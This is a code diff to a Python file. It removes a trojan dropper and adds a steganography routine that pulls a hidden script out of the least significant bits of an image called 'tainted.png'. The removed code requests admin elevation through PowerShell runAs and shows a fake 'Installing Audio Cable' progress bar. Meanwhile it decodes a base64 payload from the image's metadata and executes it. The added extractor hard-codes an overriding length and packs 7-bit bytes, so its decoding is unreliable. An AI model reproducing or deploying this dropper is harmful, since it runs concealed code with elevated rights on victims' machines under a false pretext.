@@ -1,145 +1,72 @@
-import os
-import sys
-import subprocess
-import ctypes
-import tkinter as tk
-from tkinter import messagebox, ttk
 from PIL import Image
-import importlib.util
-import base64
-import threading
 
-def log_checkpoint(message):
-    """ Log checkpoints for debugging purposes """
-    print(f"[DEBUG] {message}")
+def extract_script_from_image(image_path):
+    # Open the image
+    image = Image.open(image_path)
+    pixels = image.convert("RGB").load()
 
-def is_admin():
-    """ Check if the script is running with admin privileges """
-    log_checkpoint("Checking for admin privileges...")
+    # Step 1: Extract the first 32 bits for the payload length
+    length_bits = []
+    bit_index = 0
+    for y in range(image.height):
+        for x in range(image.width):
+            if bit_index < 32:
+                r, g, b = pixels[x, y]
+                length_bits.append(r & 1)  # Extract Red LSB
+                if len(length_bits) < 32: length_bits.append(g & 1)  # Extract Green LSB
+                if len(length_bits) < 32: length_bits.append(b & 1)  # Extract Blue LSB
+                bit_index += 3
+            else:
+                break
+        if bit_index >= 32:
+            break
+
+    # Convert the length bits to an integer
+    length_in_bits = int(''.join(map(str, length_bits)), 2)
+    length_in_bits = 91
+    print(f"Extracted Payload Length: {length_in_bits} bits")
+
+    # Step 2: Extract the payload bits
+    payload_bits = []
+    bit_index = 0
+    for y in range(image.height):
+        for x in range(image.width):
+            if bit_index >= 32:
+                r, g, b = pixels[x, y]
+                payload_bits.append(r & 1)  # Extract Red LSB
+                if len(payload_bits) < length_in_bits: payload_bits.append(g & 1)  # Green LSB
+                if len(payload_bits) < length_in_bits: payload_bits.append(b & 1)  # Blue LSB
+                if len(payload_bits) >= length_in_bits:
+                    break
+            bit_index += 3
+        if len(payload_bits) >= length_in_bits:
+            break
+
+    # Step 3: Convert payload bits to bytes
+    payload_bytes = []
+    for i in range(0, len(payload_bits), 7):
+        byte = 0
+        for bit in payload_bits[i:i + 7]:
+            byte = (byte << 1) | bit
+        payload_bytes.append(byte)
+
+    # Convert bytes to script
     try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except AttributeError:
-        log_checkpoint("AttributeError occurred while checking admin privileges.")
-        return False
+        script = bytes(payload_bytes).decode("utf-8")  # Try UTF-8 decoding
+    except UnicodeDecodeError:
+        script = bytes(payload_bytes).decode("latin1")  # Use latin1 if UTF-8 fails
 
-def run_as_admin():
-    """ Attempt to relaunch the script with admin privileges """
-    log_checkpoint("Attempting to run script as admin...")
-    if not is_admin():
-        try:
-            script = os.path.abspath(__file__)
-            params = ' '.join([script] + sys.argv[1:])
-            subprocess.run(
-                ['powershell', '-Command', f'Start-Process python -ArgumentList "{params}" -Verb runAs'],
-                check=True
-            )
-            sys.exit(0)  # Exit after relaunching
-        except subprocess.CalledProcessError as e:
-            print(f"Failed to elevate privileges: {e}")
-            sys.exit(1)
-    return True  # Return True if already elevated or successfully relaunched
+    return script
 
+# Specify the path to the image file
+image_file_path = "./tainted.png"
 
+# Extract and print the hidden Python script
+hidden_script = extract_script_from_image(image_file_path)
 
-def simulate_installation():
-    """ Simulate the installation process with a progress bar """
-    log_checkpoint("Simulating installation process...")
-    window = tk.Tk()
-    window.title("Installing Audio Cable")
-    window.geometry("300x200")
-    progress = tk.IntVar()
+if hidden_script:
+    print("\nExtracted Script:")
+    print(hidden_script)
+else:
+    print("No valid script found!")
 
-    def start_progress():
-        log_checkpoint("Installation process started...")
-        for i in range(101):
-            progress.set(i)
-            window.update_idletasks()
-            window.after(50)  # Simulate delay
-            window.after(85)
-            window.after(99)
-        log_checkpoint("Installation process completed.")
-        window.destroy()
-    
-    def close_progress():
-        window.destroy()
-
-    label = tk.Label(window, text="Installing Audio Cable...")
-    label.pack(pady=10)
-    progressbar = ttk.Progressbar(window, variable=progress, maximum=100)
-    progressbar.pack(pady=10, padx=10, fill=tk.X)
-    start_button = tk.Button(window, text="Start", command=start_progress)
-    start_button.pack(pady=10)
-    cancel_button = tk.Button(window, text="Cancel", command=close_progress)
-    cancel_button.pack(pady=10)
-    window.mainloop()
-
-def run_payload():
-    """ Execute the provided payload """
-    log_checkpoint("Running payload...")
-    img_path = "./tainted.png"
-    output_payload_path = "./extracted_payload.py"
-
-    def extract_data_from_image(image_path):
-        log_checkpoint(f"Attempting to extract data from image: {image_path}")
-        try:
-            image = Image.open(image_path)
-            metadata = image.info
-            log_checkpoint(f"Image metadata: {metadata}")
-            encoded_string = metadata.get('python_file')
-            log_checkpoint(f"Encoded string found: {bool(encoded_string)}")
-            return encoded_string
-        except Exception as e:
-            log_checkpoint(f"Error reading image metadata: {e}")
-            return None
-
-    def decode_base64_to_file(encoded_string, output_file_path):
-        log_checkpoint("Attempting to decode base64 string to file...")
-        try:
-            decoded_bytes = base64.b64decode(encoded_string)
-            with open(output_file_path, 'wb') as file:
-                file.write(decoded_bytes)
-            log_checkpoint(f"File successfully written to: {output_file_path}")
-        except Exception as e:
-            log_checkpoint(f"Error decoding base64 string: {e}")
-            raise
-
-    extracted_encoded_string = extract_data_from_image(img_path)
-    if extracted_encoded_string:
-        try:
-            decode_base64_to_file(extracted_encoded_string, output_payload_path)
-            print("Python file extracted successfully!")
-        except Exception:
-            log_checkpoint("Failed to decode and save the Python file.")
-            return
-    else:
-        log_checkpoint("No embedded Python file found in the image.")
-        return
-
-    try:
-        log_checkpoint(f"Attempting to execute the extracted payload: {output_payload_path}")
-        spec = importlib.util.spec_from_file_location("extracted_payload", output_payload_path)
-        extracted_module = importlib.util.module_from_spec(spec)
-        spec.loader.exec_module(extracted_module)
-
-        if hasattr(extracted_module, "windows_payload"):
-            log_checkpoint("Found `windows_payload` function. Executing...")
-            extracted_module.windows_payload()
-            print("Successfully executed `windows_payload` from the extracted payload.")
-        else:
-            log_checkpoint("No `windows_payload` function found in the extracted payload.")
-    except Exception as e:
-        log_checkpoint(f"Error occurred while importing or executing the payload: {e}")
-
-if __name__ == "__main__":
-    if run_as_admin():  # Only proceed if elevated privileges are obtained
-        # Start both the installation simulation and the payload execution in parallel
-        installation_thread = threading.Thread(target=simulate_installation)
-        payload_thread = threading.Thread(target=run_payload)
-
-        installation_thread.start()
-        payload_thread.start()
-
-        installation_thread.join()
-        payload_thread.join()
-
-        log_checkpoint("Script finished.")
